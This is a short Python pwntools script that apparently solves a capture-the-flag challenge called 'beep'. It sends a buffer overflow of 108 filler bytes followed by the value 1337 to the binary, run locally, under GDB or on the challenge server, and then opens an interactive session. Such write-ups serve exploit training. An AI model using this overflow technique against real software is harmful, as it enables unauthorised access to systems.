#!/usr/bin/env python3

from pwn import *

EXE = ELF("./beep")

print(EXE.path)
if args.REMOTE:
    domain = "undutmaning-beep.chals.io"
    r = remote(domain, 443, ssl=True, sni=domain)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

payload = b"A" * 108 + p32(1337)

r.recvuntil(b"> ")
r.sendline(payload)
r.interactive()
